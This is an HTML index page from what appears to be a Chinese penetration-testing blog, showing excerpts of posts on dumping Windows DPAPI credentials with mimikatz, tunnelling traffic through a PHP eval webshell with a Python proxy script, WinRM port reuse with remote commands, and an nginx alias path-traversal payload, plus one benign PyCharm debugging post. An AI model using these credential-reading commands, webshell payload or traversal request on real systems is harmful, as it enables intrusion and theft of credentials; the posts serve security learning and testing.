@@ -1,0 +1,713 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Page 4 | 😊#</title>
+  <meta name="author" content="JKme">
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+  <meta property="og:site_name" content="😊#"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+  <link rel="stylesheet" href="/css/prism-atom-dark.css" media="screen" type="text/css">
+    <link rel="stylesheet" href="/css/prism-line-numbers.css" media="screen" type="text/css">
+  <script src="/js/jquery-2.0.3.min.js"></script>
+<!--   <script src="/js/highlight.min.js"></script>
+  <script>hljs.highlightAll();</script>
+  <link rel="stylesheet" href="/css/highlight/styles/atom-one-dark.min.css" media="screen" type="text/css"> -->
+
+  <!-- analytics -->
+  
+
+
+
+
+<meta name="generator" content="Hexo 6.0.0"><link rel="alternate" href="/atom.xml" title="😊#" type="application/atom+xml">
+</head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">😊#</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/project" title="All the categories.">
+			  <i class=""></i>Projects
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class="fa fa-rss"></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 <div class="page-header logo">
+  <h1>😊#<span class="blink-fast">|</span></h1>
+</div>
+
+<div class="row page">
+
+	
+	<div class="col-md-9">
+	
+
+		<div class="slogan">
+
+
+		<i class="fa fa-heart blink-slow"></i>
+
+		wubba lubba dub dub.
+
+</div>    
+
+		<div id="top_search"></div>
+		<div class="mypage">
+		
+		<!-- title and entry -->
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2020/04/13/dpapi-pass-dump.html" >通过DPAPI获取windows身份凭证</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2020-04-13  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h3><p>DPAPI(Date Protection Application Programming Interface)，从windows2000之后，微软提供的一个特殊数据保护接口，使用了对称的加解密函数对密码加密。包括:</p>
+<ul>
+<li>IE、Chrome密码登陆表单的自动完成</li>
+<li>邮箱客户端用户密码</li>
+<li>FTP管理账户密码</li>
+<li>远程桌面身份密码</li>
+<li>……</li>
+</ul>
+<p>查找本地的Credentials:<br>通常的保存位置:</p>
+<ul>
+<li><code>%appdata%\Microsoft\Credentials</code></li>
+<li><code>%localappdata%\Microsoft\Credentials</code></li>
+<li><code>%userprofile%\AppData\Local\Microsoft\Credentials\*</code></li>
+</ul>
+<p>因为文件被隐藏，命令行下需要查看需要加上<code>/a</code>可以看到:</p>
+<pre class="line-numbers language-none"><code class="language-none">dir &#x2F;a %userprofile%\AppData\Local\Microsoft\Credentials\*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="获取GUID"><a href="#获取GUID" class="headerlink" title="获取GUID"></a>获取GUID</h3><pre class="line-numbers language-none"><code class="language-none"># 打印结构体信息
+mimikatz dpapi::cred &#x2F;in:&quot;%localappdata%\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">**BLOB**
+  dwVersion          : 00000001 - 1
+  guidProvider       : &#123;xf9d8cd0-1501-11d1-8c7a-00c04fc297eb&#125;
+  dwMasterKeyVersion : 00000001 - 1
+  guidMasterKey      : &#123;x0ad1823-abf0-4be4-b696-eb4bbddca052&#125;
+  dwFlags            : 20000000 - 536870912 (system ; )
+  dwDescriptionLen   : 00000012 - 18
+  szDescription      : 本地凭据数据
+
+  algCrypt           : 00006610 - 26128 (CALG_AES_256)
+  dwAlgCryptLen      : 00000100 - 256
+  dwSaltLen          : 00000020 - 32
+  pbSalt             : 00bcc91d576813f05e286f96b9ae3f97aef0922bb7c97b9c93b978d75027a8dc
+  dwHmacKeyLen       : 00000000 - 0
+  pbHmackKey         : 
+  algHash            : 0000800e - 32782 (CALG_SHA_512)
+  dwAlgHashLen       : 00000200 - 512
+  dwHmac2KeyLen      : 00000020 - 32
+  pbHmack2Key        : 109ef886e7807e15e7918ec1773e768b50900664d88739e42a80592a1af52d51
+  dwDataLen          : 00002a70 - 10864
+  pbData             : xxxxxxz
+  dwSignLen          : 00000040 - 64
+  pbSign             : xxxxx
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+
+	</div>
+  <a type="button" href="/2020/04/13/dpapi-pass-dump.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="背景介绍"><a href="#背景介绍" class="headerlink" title="背景介绍"></a>背景介绍</h3><p>DPAPI(Date Protection Application Programming Interface)，从windows2000之后，微软提供的一个特殊数据保护接口，使用了对称的加解密函数对密码加密。包括:</p>
+<ul>
+<li>IE、Chrome密码登陆表单的自动完成</li>
+<li>邮箱客户端用户密码</li>
+<li>FTP管理账户密码</li>
+<li>远程桌面身份密码</li>
+<li>……</li>
+</ul>
+<p>查找本地的Credentials:<br>通常的保存位置:</p>
+<ul>
+<li><code>%appdata%\Microsoft\Credentials</code></li>
+<li><code>%localappdata%\Microsoft\Credentials</code></li>
+<li><code>%userprofile%\AppData\Local\Microsoft\Credentials\*</code></li>
+</ul>
+<p>因为文件被隐藏，命令行下需要查看需要加上<code>/a</code>可以看到:</p>
+<pre class="line-numbers language-none"><code class="language-none">dir &#x2F;a %userprofile%\AppData\Local\Microsoft\Credentials\*<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<h3 id="获取GUID"><a href="#获取GUID" class="headerlink" title="获取GUID"></a>获取GUID</h3><pre class="line-numbers language-none"><code class="language-none"># 打印结构体信息
+mimikatz dpapi::cred &#x2F;in:&quot;%localappdata%\Microsoft\Credentials\DFBE70A7E5CC19A398EBF1B96859CE5D&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-none"><code class="language-none">**BLOB**
+  dwVersion          : 00000001 - 1
+  guidProvider       : &#123;xf9d8cd0-1501-11d1-8c7a-00c04fc297eb&#125;
+  dwMasterKeyVersion : 00000001 - 1
+  guidMasterKey      : &#123;x0ad1823-abf0-4be4-b696-eb4bbddca052&#125;
+  dwFlags            : 20000000 - 536870912 (system ; )
+  dwDescriptionLen   : 00000012 - 18
+  szDescription      : 本地凭据数据
+
+  algCrypt           : 00006610 - 26128 (CALG_AES_256)
+  dwAlgCryptLen      : 00000100 - 256
+  dwSaltLen          : 00000020 - 32
+  pbSalt             : 00bcc91d576813f05e286f96b9ae3f97aef0922bb7c97b9c93b978d75027a8dc
+  dwHmacKeyLen       : 00000000 - 0
+  pbHmackKey         : 
+  algHash            : 0000800e - 32782 (CALG_SHA_512)
+  dwAlgHashLen       : 00000200 - 512
+  dwHmac2KeyLen      : 00000020 - 32
+  pbHmack2Key        : 109ef886e7807e15e7918ec1773e768b50900664d88739e42a80592a1af52d51
+  dwDataLen          : 00002a70 - 10864
+  pbData             : xxxxxxz
+  dwSignLen          : 00000040 - 64
+  pbSign             : xxxxx
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+	
+	</div>
+  <a type="button" href="/2020/04/13/dpapi-pass-dump.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2019/12/13/python-debug.html" >Pycharm远程调试Docker</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2019-12-13  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>调试的流水账:</p>
+<p>原理就是pycharm作为server，远程要debug的是client。在client要安装pycharm-debug.egg，安装之后</p>
+<pre class="line-numbers language-none"><code class="language-none">python -m easy_install pycharm-debug.egg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">import pydevd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>没毛病就表示安装成功。</p>
+<p>这个pycharm的包一般在这个目录:</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;Applications&#x2F;PyCharm.app&#x2F;Contents&#x2F;debug-eggs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>然后配置pycharm:</p>
+<pre class="line-numbers language-none"><code class="language-none">在Preferences -&gt; project 会有当前项目，可以先设置 project Interpreter，但是如果单单为了调试，这个不用设置就可以。为了测试方便可以添加一个sftp同步:
+
+Flie-&gt;Setting-&gt;Build,Exception,Deployment-&gt;Deployment
+
+添加和Docker相关的端口和IP，举例来说把Docker的22端口映射到本机的20022。设置完了之后，可以在这里同步代码:
+
+Tools-&gt;Deployment-&gt;Sync with deploymed to sftp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>经过上面的步骤现在有了一个sftp来同步本地的代码和远程的代码，然后设置使用pydevd来远程调试。</p>
+	
+
+	</div>
+  <a type="button" href="/2019/12/13/python-debug.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>调试的流水账:</p>
+<p>原理就是pycharm作为server，远程要debug的是client。在client要安装pycharm-debug.egg，安装之后</p>
+<pre class="line-numbers language-none"><code class="language-none">python -m easy_install pycharm-debug.egg<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<pre class="line-numbers language-none"><code class="language-none">import pydevd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>没毛病就表示安装成功。</p>
+<p>这个pycharm的包一般在这个目录:</p>
+<pre class="line-numbers language-none"><code class="language-none">&#x2F;Applications&#x2F;PyCharm.app&#x2F;Contents&#x2F;debug-eggs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>然后配置pycharm:</p>
+<pre class="line-numbers language-none"><code class="language-none">在Preferences -&gt; project 会有当前项目，可以先设置 project Interpreter，但是如果单单为了调试，这个不用设置就可以。为了测试方便可以添加一个sftp同步:
+
+Flie-&gt;Setting-&gt;Build,Exception,Deployment-&gt;Deployment
+
+添加和Docker相关的端口和IP，举例来说把Docker的22端口映射到本机的20022。设置完了之后，可以在这里同步代码:
+
+Tools-&gt;Deployment-&gt;Sync with deploymed to sftp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>经过上面的步骤现在有了一个sftp来同步本地的代码和远程的代码，然后设置使用pydevd来远程调试。</p>
+	
+	</div>
+  <a type="button" href="/2019/12/13/python-debug.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2019/10/23/php-eval-proxy.html" >PHP Eval HTTP Proxy</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2019-10-23  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>背景: linux，php环境下的reGeorg不可用。<br>目标: 分析reGeorg的原理尝试改一下<br>结果: 造了一个半成品，因为不能保持socks连通，可以用来访问简单的协议流数据。比如http，mongo，redis</p>
+<pre class="line-numbers language-none"><code class="language-none">Protocols that are suitable to smuggle
+  HTTP based protocol:
+    Elastic, CouchDB, Mongodb, Docker
+
+  Text-based protocol:
+    FTP, SMTP, Redis, Memcached<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h3 id="尝试1"><a href="#尝试1" class="headerlink" title="尝试1"></a>尝试1</h3><p>这个脚本是个残的:</p>
+<pre class="line-numbers language-none"><code class="language-none">#coding: utf-8
+import socket
+import binascii
+import requests
+
+
+headers &#x3D; &#123;
+&quot;Host&quot;: &quot;&quot;,
+&quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,
+&quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (X11; U; Linux i686; en-GB; rv:1.7.6) Gecko&#x2F;20050405 Firefox&#x2F;1.0 (Ubuntu package 1.0.2)&quot;,
+&quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;,
+&quot;Connection&quot;: &quot;close&quot;
+&#125;
+
+url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;eval.php&quot;
+s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind((&quot;127.0.0.1&quot;,8889))
+s.listen(5)
+sock, addr_info &#x3D; s.accept()
+
+while True:
+    print &#39;Connect by &#39;, addr_info
+    data &#x3D; sock.recv(102400)
+    payload &#x3D; &#39;pass&#x3D;%24res%20%3D%20fsockopen(%22127.0.0.1%22%2C27017)%3B%0A%24raw%20%3D%20hex2bin(%22&#39; + hex2bin(data) + &quot;%22)%3B%0Astream_set_timeout(%24res%2C5)%3B%0Astream_set_blocking(false)%3B%0Afwrite(%24res%2C%24raw)%3B%0A%24info%20%3D%20stream_get_meta_data(%24res)%3B%0Aecho%20%24info%5B&#39;timed_out&#39;%5D%3B%0Awhile%20(%24o%20%3Dfgets(%24res%2C5))%7B%0A%20%20%20%20%20%20%20%20if(%24o%20%3D%3D%3D%20false)%7Becho%20&#39;false%20lala&#39;%3B%7D%0A%24readBuff%20.%3D%20%24o%3B%0A%7D%0Aecho%20%24readBuff%3B%0Afclose(%24res)%3B&quot;
+    print payload
+    data2 &#x3D; requests.post(url&#x3D;url,headers&#x3D;headers,data&#x3D;payload,proxies&#x3D;&#123;&quot;http&quot;:&quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;&#125;,timeout&#x3D;30).content
+    print data2
+    print &quot;sending data&quot;
+    sock.send(data2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>hex2bin is available with PHP Version &gt;= 5.4.0</strong></p>
+<p>绑定本机的8889端口，然后mongo直接连,<code>mongo --port 8889</code>,如果想观察之间的流量可以这样做:</p>
+ <pre class="line-numbers language-none"><code class="language-none">python mongo_proxy  &#x2F;&#x2F;监听8889
+socat -x -d -v tcp-listen:8888,reuseaddr,fork tcp:127.0.0.1:8889 &#x2F;&#x2F;流量肉眼可以看
+mongo --port 8888  &#x2F;&#x2F;连接8888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>发散一下，这个整体就是一个请求代理，包裹一下发送到了远程的webshell，然后webshell之行脚本。Regeorg是更通用的方式，你可以把这个脚本看作regeorg作用的<code>子集</code>，因为如果要访问端口之类的就需要改脚本了。</p>
+<p>看了看Regeorg的实现，就是接受socks5或者socks4的代理之后，发送数据包到远程服务器，过程大概是这样子的:</p>
+	
+
+	</div>
+  <a type="button" href="/2019/10/23/php-eval-proxy.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>背景: linux，php环境下的reGeorg不可用。<br>目标: 分析reGeorg的原理尝试改一下<br>结果: 造了一个半成品，因为不能保持socks连通，可以用来访问简单的协议流数据。比如http，mongo，redis</p>
+<pre class="line-numbers language-none"><code class="language-none">Protocols that are suitable to smuggle
+  HTTP based protocol:
+    Elastic, CouchDB, Mongodb, Docker
+
+  Text-based protocol:
+    FTP, SMTP, Redis, Memcached<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+
+
+<h3 id="尝试1"><a href="#尝试1" class="headerlink" title="尝试1"></a>尝试1</h3><p>这个脚本是个残的:</p>
+<pre class="line-numbers language-none"><code class="language-none">#coding: utf-8
+import socket
+import binascii
+import requests
+
+
+headers &#x3D; &#123;
+&quot;Host&quot;: &quot;&quot;,
+&quot;Accept-Encoding&quot;: &quot;gzip, deflate&quot;,
+&quot;User-Agent&quot;: &quot;Mozilla&#x2F;5.0 (X11; U; Linux i686; en-GB; rv:1.7.6) Gecko&#x2F;20050405 Firefox&#x2F;1.0 (Ubuntu package 1.0.2)&quot;,
+&quot;Content-Type&quot;: &quot;application&#x2F;x-www-form-urlencoded&quot;,
+&quot;Connection&quot;: &quot;close&quot;
+&#125;
+
+url &#x3D; &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;eval.php&quot;
+s &#x3D; socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+s.bind((&quot;127.0.0.1&quot;,8889))
+s.listen(5)
+sock, addr_info &#x3D; s.accept()
+
+while True:
+    print &#39;Connect by &#39;, addr_info
+    data &#x3D; sock.recv(102400)
+    payload &#x3D; &#39;pass&#x3D;%24res%20%3D%20fsockopen(%22127.0.0.1%22%2C27017)%3B%0A%24raw%20%3D%20hex2bin(%22&#39; + hex2bin(data) + &quot;%22)%3B%0Astream_set_timeout(%24res%2C5)%3B%0Astream_set_blocking(false)%3B%0Afwrite(%24res%2C%24raw)%3B%0A%24info%20%3D%20stream_get_meta_data(%24res)%3B%0Aecho%20%24info%5B&#39;timed_out&#39;%5D%3B%0Awhile%20(%24o%20%3Dfgets(%24res%2C5))%7B%0A%20%20%20%20%20%20%20%20if(%24o%20%3D%3D%3D%20false)%7Becho%20&#39;false%20lala&#39;%3B%7D%0A%24readBuff%20.%3D%20%24o%3B%0A%7D%0Aecho%20%24readBuff%3B%0Afclose(%24res)%3B&quot;
+    print payload
+    data2 &#x3D; requests.post(url&#x3D;url,headers&#x3D;headers,data&#x3D;payload,proxies&#x3D;&#123;&quot;http&quot;:&quot;http:&#x2F;&#x2F;127.0.0.1:8080&quot;&#125;,timeout&#x3D;30).content
+    print data2
+    print &quot;sending data&quot;
+    sock.send(data2)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p><strong>hex2bin is available with PHP Version &gt;= 5.4.0</strong></p>
+<p>绑定本机的8889端口，然后mongo直接连,<code>mongo --port 8889</code>,如果想观察之间的流量可以这样做:</p>
+ <pre class="line-numbers language-none"><code class="language-none">python mongo_proxy  &#x2F;&#x2F;监听8889
+socat -x -d -v tcp-listen:8888,reuseaddr,fork tcp:127.0.0.1:8889 &#x2F;&#x2F;流量肉眼可以看
+mongo --port 8888  &#x2F;&#x2F;连接8888<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>发散一下，这个整体就是一个请求代理，包裹一下发送到了远程的webshell，然后webshell之行脚本。Regeorg是更通用的方式，你可以把这个脚本看作regeorg作用的<code>子集</code>，因为如果要访问端口之类的就需要改脚本了。</p>
+<p>看了看Regeorg的实现，就是接受socks5或者socks4的代理之后，发送数据包到远程服务器，过程大概是这样子的:</p>
+	
+	</div>
+  <a type="button" href="/2019/10/23/php-eval-proxy.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2019/10/23/winrm.html" >winRM端口复用</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2019-10-23  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>基本原理是利用windows的远程管理服务WinRM,在Windows 2003 Server加入了内核级驱动程序(http.sys),用于监听http流量并根据URL进行处理，允许任意用户进程共享用于HTTP流量的TCP端口。通过http.sys,多个进程可以同时监听同一端口的HTTP流量</p>
+<p>系统默认有10个DACl，可以通过<code>netsh http show urlacl</code>看到具体内容，其中5985是http端口，5986是https，在我的Windows Server 2012上面默认没有开启，只开启了一个5985端口。</p>
+<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>Windows 2008默认不开启该服务，windows 2012以及以上默认开启该服务。</p>
+<h3 id="开启服务"><a href="#开启服务" class="headerlink" title="开启服务"></a>开启服务</h3><p>本地机器需要连接远程WinRM服务的时候，本地也需要开启WinRM服务，然后设置信任连接的主机，执行命令:</p>
+<pre class="line-numbers language-none"><code class="language-none">winrm quickconfig -q
+winrm set winrm&#x2F;config&#x2F;Client @&#123;TrustedHosts&#x3D;&quot;*&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>连接(默认端口是5985，需要加上去):</p>
+<pre class="line-numbers language-none"><code class="language-none">winrs -r:http:&#x2F;&#x2F;&lt;ip&gt;:&lt;port&gt; -u:&lt;user&gt; -p:&lt;pass&gt; &lt;command&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+	
+
+	</div>
+  <a type="button" href="/2019/10/23/winrm.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>基本原理是利用windows的远程管理服务WinRM,在Windows 2003 Server加入了内核级驱动程序(http.sys),用于监听http流量并根据URL进行处理，允许任意用户进程共享用于HTTP流量的TCP端口。通过http.sys,多个进程可以同时监听同一端口的HTTP流量</p>
+<p>系统默认有10个DACl，可以通过<code>netsh http show urlacl</code>看到具体内容，其中5985是http端口，5986是https，在我的Windows Server 2012上面默认没有开启，只开启了一个5985端口。</p>
+<h3 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h3><p>Windows 2008默认不开启该服务，windows 2012以及以上默认开启该服务。</p>
+<h3 id="开启服务"><a href="#开启服务" class="headerlink" title="开启服务"></a>开启服务</h3><p>本地机器需要连接远程WinRM服务的时候，本地也需要开启WinRM服务，然后设置信任连接的主机，执行命令:</p>
+<pre class="line-numbers language-none"><code class="language-none">winrm quickconfig -q
+winrm set winrm&#x2F;config&#x2F;Client @&#123;TrustedHosts&#x3D;&quot;*&quot;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>连接(默认端口是5985，需要加上去):</p>
+<pre class="line-numbers language-none"><code class="language-none">winrs -r:http:&#x2F;&#x2F;&lt;ip&gt;:&lt;port&gt; -u:&lt;user&gt; -p:&lt;pass&gt; &lt;command&gt; <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+	
+	</div>
+  <a type="button" href="/2019/10/23/winrm.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
+			<a href="/2019/09/17/nginx_path_traversle.html" >nginx的目录穿越</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2019-09-17  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>nginx在使用proxy_pass的时候，需要处理静态文件有时候会这样做:</p>
+<pre class="line-numbers language-none"><code class="language-none">location &#x2F;static &#123;
+               alias &#x2F;home&#x2F;uploads&#x2F;static&#x2F;;
+       &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>payload:</p>
+<pre class="line-numbers language-none"><code class="language-none">curl vuln.com&#x2F;static..&#x2F;requirements.pip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>上面如果是两个路径最后都没有带<code>/</code>或者都带<code>/</code>则该漏洞不存在。</p>
+<p>代理末尾添加/之后，nginx会先对uri进行normalized处理，使用../读取文件会失败，当没有添加/的时候，nginx会把原请求直接转发给后端服务器，所以可以读取成功。</p>
+
+	
+
+	</div>
+  <a type="button" href="/2019/09/17/nginx_path_traversle.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>nginx在使用proxy_pass的时候，需要处理静态文件有时候会这样做:</p>
+<pre class="line-numbers language-none"><code class="language-none">location &#x2F;static &#123;
+               alias &#x2F;home&#x2F;uploads&#x2F;static&#x2F;;
+       &#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+
+<p>payload:</p>
+<pre class="line-numbers language-none"><code class="language-none">curl vuln.com&#x2F;static..&#x2F;requirements.pip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>上面如果是两个路径最后都没有带<code>/</code>或者都带<code>/</code>则该漏洞不存在。</p>
+<p>代理末尾添加/之后，nginx会先对uri进行normalized处理，使用../读取文件会失败，当没有添加/的时候，nginx会把原请求直接转发给后端服务器，所以可以读取成功。</p>
+
+	
+	</div>
+  <a type="button" href="/2019/09/17/nginx_path_traversle.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+
+		</div>
+
+		<!-- pagination -->
+		<div>
+  		<center>
+		<div class="pagination">
+
+   
+    
+     <a href="/page/3/" type="button" class="btn btn-default"><i class="fa fa-arrow-circle-o-left"></i> Prev</a>
+      
+
+        <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+ 
+       <a href="/page/5/" type="button" class="btn btn-default ">Next<i class="fa fa-arrow-circle-o-right"></i></a>     
+        
+
+  
+</div>
+
+  		</center>
+		</div>
+
+		
+		
+	</div> <!-- col-md-9 -->
+
+	
+		<div class="col-md-3">
+	<div id="sidebar">
+	
+			
+  <div id="site_search">
+   <div class="form-group">
+    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
+   </div>  
+  <div id="local-search-result"></div>
+  </div>
+
+
+		
+			
+	<div class="widget">
+		<h4>Categories</h4>
+		<ul class="tag_box inline list-unstyled">
+		
+			<li><a href="/categories/CTF/">CTF<span>1</span></a></li>
+		
+			<li><a href="/categories/Fun/">Fun<span>3</span></a></li>
+		
+			<li><a href="/categories/Learning/">Learning<span>16</span></a></li>
+		
+			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
+		
+			<li><a href="/categories/Pentest/">Pentest<span>42</span></a></li>
+		
+			<li><a href="/categories/Python/">Python<span>5</span></a></li>
+		
+			<li><a href="/categories/SQL/">SQL<span>7</span></a></li>
+		
+			<li><a href="/categories/Tools/">Tools<span>2</span></a></li>
+		
+		</ul>
+	</div>
+
+		
+			
+
+		
+			
+<div class="widget">
+  <h4>Recent Posts</h4>
+  <ul class="entry list-unstyled">
+    
+      <li>
+        <a href="/2021/08/06/windows-ntlm-smb-scan.html" ><i class="fa fa-file-o"></i>NTLM端口信息探测</a>
+      </li>
+    
+      <li>
+        <a href="/2021/08/02/siem-on-elk.html" ><i class="fa fa-file-o"></i>SIEM On ELK</a>
+      </li>
+    
+      <li>
+        <a href="/2021/07/29/silverFish.html" ><i class="fa fa-file-o"></i>Silver调查报告</a>
+      </li>
+    
+      <li>
+        <a href="/2021/05/27/spring-boot-actuator.html" ><i class="fa fa-file-o"></i>Spring Boot Actuator漏洞复现</a>
+      </li>
+    
+      <li>
+        <a href="/2021/04/06/defense-from-c2.html" ><i class="fa fa-file-o"></i>防御性C2玩具尝试</a>
+      </li>
+    
+  </ul>
+</div>
+
+		
